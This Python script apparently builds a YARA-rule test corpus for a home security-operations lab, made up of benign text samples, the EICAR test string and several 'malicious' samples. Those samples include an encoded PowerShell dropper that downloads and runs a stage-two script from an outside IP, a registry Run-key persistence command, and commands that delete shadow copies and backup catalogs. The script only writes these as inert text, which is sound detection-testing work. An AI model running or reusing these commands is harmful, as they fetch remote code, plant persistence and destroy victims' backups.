#!/usr/bin/env python3
"""
generate_test_samples.py -- The YARA rule test corpus
SOC Home Lab Project | github.com/AurelioAvila

Every sample lives in-memory as a Python dict, not as loose files on disk.
This is deliberate, not a shortcut: the EICAR standard antivirus test
string (eicar.org) is *designed* to be flagged the instant a real AV
engine sees it written to disk -- Windows Defender quarantined it within
milliseconds during development of this repo, deleting the file out from
under the test run. Scanning content in-memory (yara's `match(data=...)`)
is both the fix and, honestly, the more realistic simulation of how a
real file-scanning pipeline hooks into an EDR product rather than
shelling out to scan loose files.

`write_reference_copies()` still writes the non-EICAR samples to disk as
human-readable reference files, since they're inert plain text with no
detection triggers of their own.
"""
from pathlib import Path

MALICIOUS_DIR = Path("test_samples/malicious")
BENIGN_DIR = Path("test_samples/benign")

# The real, standard EICAR test string (eicar.org) -- 68 bytes of plain
# ASCII, safe to store and transmit anywhere, used industry-wide to test
# AV/YARA pipelines without handling real malware. Never written to disk
# as a standalone file in this repo -- see module docstring.
EICAR_STRING = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

MALICIOUS_SAMPLES = {
    "obfuscated_powershell_dropper.txt": (
        "powershell.exe -NoP -W Hidden -Exec Bypass -EncodedCommand "
        "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA\n"
        "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.45/stage2.ps1')\n"
    ),
    "registry_persistence_and_shadow_delete.txt": (
        "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SystemHelper "
        "/d C:\\Users\\Public\\AppData\\Local\\Temp\\svchost_upd.exe\n"
        "vssadmin delete shadows /all /quiet\n"
        "wbadmin delete catalog -quiet\n"
    ),
    "ransom_note.txt": (
        "!!! YOUR_FILES HAVE BEEN ENCRYPTED !!!\n"
        "See README_DECRYPT.txt in every affected folder for HOW_TO_RECOVER your data.\n"
    ),
    "eicar_test_signature": EICAR_STRING,  # in-memory only, see docstring
}

BENIGN_SAMPLES = {
    "normal_readme.txt": (
        "# Project Setup\n\n"
        "1. Clone the repository\n"
        "2. Run `pip install -r requirements.txt`\n"
        "3. Copy .env.example to .env and fill in your API key\n"
        "4. Run `python main.py` to start\n\n"
        "See CONTRIBUTING.md for guidelines on submitting pull requests.\n"
    ),
    "changelog.txt": (
        "v1.2.0 - Added dark mode support\n"
        "v1.1.0 - Fixed login timeout issue\n"
        "v1.0.0 - Initial release\n"
    ),
    "meeting_notes.txt": (
        "Sprint planning notes:\n"
        "- Review backend API rate limiting\n"
        "- Discuss Q3 roadmap priorities\n"
        "- Follow up on the customer support ticket backlog\n"
    ),
    "legit_startup_script.txt": (
        "@echo off\n"
        "echo Starting application...\n"
        "cd C:\\Program Files\\MyApp\n"
        "MyApp.exe --config production.json\n"
    ),
}


def write_reference_copies():
    """Write the non-EICAR samples to disk as human-readable reference
    files. The EICAR sample is deliberately excluded -- see module docstring."""
    MALICIOUS_DIR.mkdir(parents=True, exist_ok=True)
    BENIGN_DIR.mkdir(parents=True, exist_ok=True)

    written = 0
    for name, content in MALICIOUS_SAMPLES.items():
        if name == "eicar_test_signature":
            continue
        (MALICIOUS_DIR / name).write_text(content, encoding="utf-8")
        written += 1
    for name, content in BENIGN_SAMPLES.items():
        (BENIGN_DIR / name).write_text(content, encoding="utf-8")
        written += 1

    print(f"[+] {written} reference sample files written under test_samples/")
    print("    (EICAR sample stays in-memory only -- real AV engines quarantine")
    print("     it on sight, which is the correct behavior, not a bug here)")


if __name__ == "__main__":
    write_reference_copies()
